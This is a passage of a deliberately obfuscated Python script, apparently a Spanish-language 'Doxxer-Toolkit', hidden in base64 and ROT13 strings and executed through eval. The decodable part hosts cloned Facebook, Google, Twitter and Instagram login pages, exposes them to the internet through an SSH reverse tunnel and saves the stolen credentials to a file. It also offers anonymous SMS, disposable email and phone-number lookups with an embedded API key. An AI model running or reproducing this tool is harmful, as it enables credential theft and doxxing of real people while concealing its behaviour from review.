hIG9wY2lvbjogJykpCiAgICBpZiBicnVoID09IDE6CiAgICAgIHdlYmJyb3dzZXIub3BlbignaHR0cHM6Ly90ZW1wLW1haWwub3JnL2VzLycpCiAgICAgIGVtYWlsZmFrKCkKICAgIGVsaWYgYnJ1aCA9PSAyOgogICAgICBvcy5zeXN0ZW0oInRlcm11eC1vcGVuIGh0dHBzOi8vdGVtcC1tYWlsLm9yZy9lcy8iKQogICAgICBlbWFpbGZhaygpCiAgICBlbGlmIGJydWggPT0gMDA6CiAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgICBwcmludChsb2dvKQogICAgICBlbWFpbGZhaygpCiAgICBlbGlmIGJydWggPT0gOTk6CiAgICAgIGV4aXQoKQogICAgZWxzZToKICAgICAgIHByaW50KCdbfl0gRXJyb3Igb3BjaW9uIGludmFsaWRhLicpCiAgICAgICB0aW1lLnNsZWVwKDIpCiAgICAgICBlbWFpbGZhaygpCiAgZWxpZiBPUCA9PSAwMDoKICAgIG1lbnUoKQogIGVsaWYgT1AgPT0gOTk6CiAgICBleGl0KCkKICBlbHNlOgogICAgcHJpbnQoJ1t+XSBFcnJvciBvcGNpb24gaW52YWxpZGEuJykKICAgIHRpbWUuc2xlZXAoMikKICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgcHJpbnQobG9nbykKICAgIGVtYWlsZmFrKCkKICAKZGVmIHBoaXNoaW5nKCk6CiAgb3Muc3lzdGVtKCJjbGVhciIpCiAgcHJpbnQobG9nbykKICBwcmludCgnXG5bfl0gU2VsZWNjaW9uYSB1bmEgb3BjaW9uJykKICBwcmludCgnJycKICBbMV0gRmFjZWJvb2sKICAKICBbMl0gR29vZ2xlCiAgCiAgWzNdIFR3aXR0ZXIKICAKICBbNF0gSW5zdGFncmFtCiAgCiAgWzAwXSBSZWdyZXNhciBhbCBtZW51IHByaW5jaXBhbAogIAogIFs5OV0gU2FsaXIKICAnJycpCiAgWVAgPSBpbnQoaW5wdXQoJ1t+XSBFbGlqZSB1bmEgb3BjaW9uOiAnKSkKICBpZiBZUCA9PSAxOgogICAgcHJpbnQoZidcbntDb2xvcmVzLmF6dWx9W35dIExvcyB1c3VhcmlvcyBzZSBndWFyZGFyYW4gZW46IERveHhlci1Ub29sa2l0Ly5wYWdlcy9GYWNlYm9vay91c3Vhcmlvcy50eHQnKQogICAgcHJpbnQoZidcbntDb2xvcmVzLnZlcmRlfVt+XSBMb3MgcHVlZGVzIHZlciBjb24gZWwgY29tYW5kbzogY2F0IERveHhlci1Ub29sa2l0Ly5wYWdlcy9GYWNlYm9vay91c3Vhcmlvcy50eHQnKQogICAgcHJpbnQoZidcbntDb2xvcmVzLm1hZ2VudGF9W35dIFBhcmEgc2FsaXIgcHJlc2lvbmEgQ1RSTCArIEMnKQogICAgcHJpbnQoJyAnKQogICAgY21kID0gInBocCAtdCAucGFnZXMvRmFjZWJvb2sgLVMgbG9jYWxob3N0OjgwODAgJiBzc2ggLVIgODA6bG9jYWxob3N0OjgwODAgbm9rZXlAbG9jYWxob3N0LnJ1biIKICAgIHAgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSkKICAgIGEgPSBwLmNvbW11bmljYXRlKClbMF0KICBlbGlmIFlQID09IDI6CiAgICBwcmludChmJ1xue0NvbG9yZXMuYXp1bH1bfl0gTG9zIHVzdWFyaW9zIHNlIGd1YXJkYXJhbiBlbjogRG94eGVyLVRvb2xraXQvLnBhZ2VzL0dvb2dsZS91c3Vhcmlvcy50eHQnKQogICAgcHJpbnQoZidcbntDb2xvcmVzLnZlcmRlfVt+XSBMb3MgcHVlZGVzIHZlciBjb24gZWwgY29tYW5kbzogY2F0IERveHhlci1Ub29sa2l0Ly5wYWdlcy9Hb29nbGUvdXN1YXJpb3MudHh0JykKICAgIHByaW50KGYnXG57Q29sb3Jlcy5tYWdlbnRhfVt+XSBQYXJhIHNhbGlyIHByZXNpb25hIENUUkwgKyBDJykKICAgIHByaW50KCcgJykKICAgIGNtZCA9ICJwaHAgLXQgLnBhZ2VzL0dvb2dsZSAtUyBsb2NhbGhvc3Q6ODA4MCAmIHNzaCAtUiA4MDpsb2NhbGhvc3Q6ODA4MCBub2tleUBsb2NhbGhvc3QucnVuIgogICAgcCA9IHN1YnByb2Nlc3MuUG9wZW4oY21kLCBzaGVsbD1UcnVlKQogICAgYSA9IHAuY29tbXVuaWNhdGUoKVswXQogIGVsaWYgWVAgPT0gMzoKICAgIHByaW50KGYnXG57Q29sb3Jlcy5henVsfVt+XSBMb3MgdXN1YXJpb3Mgc2UgZ3VhcmRhcmFuIGVuOiBEb3h4ZXItVG9vbGtpdC8ucGFnZXMvVHdpdHRlci91c3Vhcmlvcy50eHQnKQogICAgcHJpbnQoZidcbntDb2xvcmVzLnZlcmRlfVt+XSBMb3MgcHVlZGVzIHZlciBjb24gZWwgY29tYW5kbzogY2F0IERveHhlci1Ub29sa2l0Ly5wYWdlcy9Ud2l0dGVyL3VzdWFyaW9zLnR4dCcpCiAgICBwcmludChmJ1xue0NvbG9yZXMubWFnZW50YX1bfl0gUGFyYSBzYWxpciBwcmVzaW9uYSBDVFJMICsgQycpCiAgICBwcmludCgnICcpCiAgICBjbWQgPSAicGhwIC10IC5wYWdlcy9Ud2l0dGVyIC1TIGxvY2FsaG9zdDo4MDgwICYgc3NoIC1SIDgwOmxvY2FsaG9zdDo4MDgwIG5va2V5QGxvY2FsaG9zdC5ydW4iCiAgICBwID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUpCiAgICBhID0gcC5jb21tdW5pY2F0ZSgpWzBdCiAgZWxpZiBZUCA9PSA0OgogICAgcHJpbnQoZidcbntDb2xvcmVzLmF6dWx9W35dIExvcyB1c3VhcmlvcyBzZSBndWFyZGFyYW4gZW46IERveHhlci1Ub29sa2l0Ly5wYWdlcy9JbnN0YWdyYW0vdXN1YXJpb3MudHh0JykKICAgIHByaW50KGYnXG57Q29sb3Jlcy52ZXJkZX1bfl0gTG9zIHB1ZWRlcyB2ZXIgY29uIGVsIGNvbWFuZG86IERveHhlci1Ub29sa2l0Ly5wYWdlcy9JbnN0YWdyYW0vdXN1YXJpb3MudHh0JykKICAgIHByaW50KGYnXG57Q29sb3Jlcy5tYWdlbnRhfVt+XSBQYXJhIHNhbGlyIHByZXNpb25hIENUUkwgKyBDJykKICAgIHByaW50KCcgJykKICAgIGNtZCA9ICJwaHAgLXQgLnBhZ2VzL0luc3RhZ3JhbSAtUyBsb2NhbGhvc3Q6ODA4MCAmIHNzaCAtUiA4MDpsb2NhbGhvc3Q6ODA4MCBub2tleUBsb2NhbGhvc3QucnVuIgogICAgcCA9IHN1YnByb2Nlc3MuUG9wZW4oY21kLCBzaGVsbD1UcnVlKQogICAgYSA9IHAuY29tbXVuaWNhdGUoKVswXQogIGVsaWYgWVAgPT0gMDA6CiAgICBtZW51KCkKICBlbGlmIFlQID09IDk5OgogICAgZXhpdCgpCiAgCmRlZiBzbXMoKToKICBwcmludCgnXG5bMV0gQWJyaXIgcGFyYSBsaW5rIHBhcmEgbGludXgnKQogIHByaW50KCdcblsyXSBBYnJpciBwYXJhIHRlcm11eCcpCiAgcHJpbnQoJ1xuWzAwXSBSZWdyZXNhciBhbCBtZW51IHByaW5jaXBhbCcpCiAgcHJpbnQoJ1xuWzk5XSBTYWxpcicpCiAgWVIgPSBpbnQoaW5wdXQoJ1t+XSBFbGlqZSB1bmEgb3BjaW9uOiAnKSkKICBpZiBZUiA9PSAxOgogICAgd2ViYnJvd3Nlci5vcGVuKCdodHRwOi8vd3d3LnNlbmRhbm9ueW1vdXNzbXMuY29tLycpCiAgZWxpZiBZUiA9PSAyOgogICAgb3Muc3lzdGVtKCJ0ZXJtdXgtb3BlbiBodHRwOi8vd3d3LnNlbmRhbm9ueW1vdXNzbXMuY29tLyIpCiAgZWxpZiBZUiA9PSAwMDoKICAgIG1lbnUoKQogIGVsaWYgWVIgPT0gOTk6CiAgICBleGl0KCkKICAgIApkZWYgbnVtZXJvKCk6CiAgICBrZXkgPSAiZDBmOGQ0OGZiNmNjY2JhMDg3NTNjMWVkNTFmZmZhZTUiCiAgICBwcmludCgnW35dIEVqZW1wbG86ICsxOTA4NzY1NDMyMScpCiAgICBudW1lcm8gPSBpbnB1dCgnW35dIEluZ3Jlc2EgZWwgbnVtZXJvIGRlIHRlbGVmb25vOiAnKQogICAgbnVtZXJvX2FwaSA9IGYiaHR0cDovL2FwaWxheWVyLm5ldC9hcGkvdmFsaWRhdGU/YWNjZXNzX2tleT17a2V5fSZudW1iZXI9e251bWVyb30iCiAgICBkYXRvcyA9IHJlcXVlc3RzLmdldChudW1lcm9fYXBpKS5qc29uKCkKICAgIHByaW50KCdcblt+XSBOdW1lcm86ICcsIGRhdG9zWydudW1iZXInXSkKICAgIHByaW50KCdbfl0gQ29kaWdvIGRlbCBwYWlzOiAnLCBkYXRvc1snY291bnRyeV9jb2RlJ10pCiAgICBwcmludCgnW35dIE5vbWJyZSBkZWwgcGFpczogJywgZGF0b3NbJ2NvdW50cnlfbmFtZSddKQogICAgcHJpbnQoJ1t+XSBVYmljYWNpb246ICcsIGRhdG9zWydsb2NhdGlvbiddKQogICAgcHJpbnQoJ1t+XSBUcmFuc3BvcnRhZG9yOiAnLCBkYXRvc1snY2FycmllciddKQogICAgcHJpbnQoJ1xuW35dIEVzY2FuZW8gY29tcGxldG8uJykKCmRlZiBvc2ludHBhKCk6CiAgb3Muc3lzdGVtKCJjbGVhciIpCiAgcHJpbnQobG9nbykKICBwcmludCgnJydcbgogIFsxXSBvc2ludGZyYW1ld29yawogIAogIFsyXSBvc2ludCB0ZWNobmlxdWVzCiAgCiAgWzAwXSBSZWdyZXNhciBhbCBtZW51IHByaW5jaXBhbAogIAogIFs5OV0gU2FsaXIKICAnJycpCiAgb3NpbnQgPSBpbnQoaW5wdXQoJ1t+XSBFc2NyaWJlIHVuIG51bWVybzogJykpCiAgaWYgb3NpbnQgPT0gMToKICAgIHByaW50KCdcblsxXSBBYnJpciBsaW5rIHBhcmEgbGludXgnKQogICAgcHJpbnQoJ1xuWzJdIEFicmlyIGxpbmsgcGFyYSB0ZXJtdXgnKQogICAgcHJpbnQoJ1xuWzAwXSBSZWdyZXNhciBhbCBtZW51IHByaW5jaXBhbCcpCiAgICBwcmludCgnXG5bOTldIFNhbGlyJykKICAgIGVsZWppcjk5ID0gaW50KGlucHV0KCdbfl0gRXNjcmliZSB1biBudW1lcm86ICcpKQogICAgaWYgZWxlamlyOTkgPT0gMToKICAgICAgd2ViYnJvd3Nlci5vcGVuKCdodHRwczovL29zaW50ZnJhbWV3b3JrLmNvbS8nKQogICAgICBvc2ludHBhKCkKICAgIGVsaWYgZWxlamlyOTkgPT0gMjoKICAgICAgb3Muc3lzdGVtKCJ0ZXJtdXgtb3BlbiBodHRwczovL29zaW50ZnJhbWV3b3JrLmNvbS8iKQogICAgICBvc2ludHBhKCkKICAgIGVsaWYgZWxlamlyOTkgPT0gMDA6CiAgICAgIG9zaW50cGEoKQogICAgZWxpZiBlbGVqaXI5OSA9PSA5OToKICAgICAgZXhpdCgpCiAgICBlbHNlOgogICAgICBwcmludCgnW35dIEVycm9yIG9wY2lvbiBpbnZhbGlkYS4nKQogICAgICB0aW1lLnNsZWVwKDIpCiAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgICBvc2ludHBhKCkKICBlbGlmIG9zaW50ID09IDI6CiAgICBwcmludCgnXG5bMV0gQWJyaXIgbGluayBwYXJhIGxpbnV4JykKICAgIHByaW50KCdcblsyXSBBYnJpciBsaW5rIHBhcmEgdGVybXV4JykKICAgIHByaW50KCdcblswMF0gUmVncmVzYXIgYWwgbWVudSBwcmluY2lwYWwnKQogICAgcHJpbnQoJ1xuWzk5XSBTYWxpcicpCiAgICBlbGVqaXI5OSA9IGludChpbnB1dCgnW35dIEVzY3JpYmUgdW4gbnVtZXJvOiAnKSkKICAgIGlmIGVsZWppcjk5ID09IDE6CiAgICAgIHdlYmJyb3dzZXIub3BlbignaHR0cHM6Ly93d3cub3NpbnR0ZWNobmlxdWVzLmNvbS8nKQogICAgICBvc2ludHBhKCkKICAgIGVsaWYgZWxlamlyOTkgPT0gMjoKICAgICAgb3Muc3lzdGVtKCJ0ZXJtdXgtb3BlbiBodHRwczovL3d3dy5vc2ludHRlY2huaXF1ZXMuY29tLyIpCiAgICBlbGlmIGVsZWppcjk5ID09IDAwOgogICAgICBvc2ludHBhKCkKICAgIGVsaWYgZWxlamlyOTkgPT0gOTk6CiAgICAgIGV4aXQoK'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
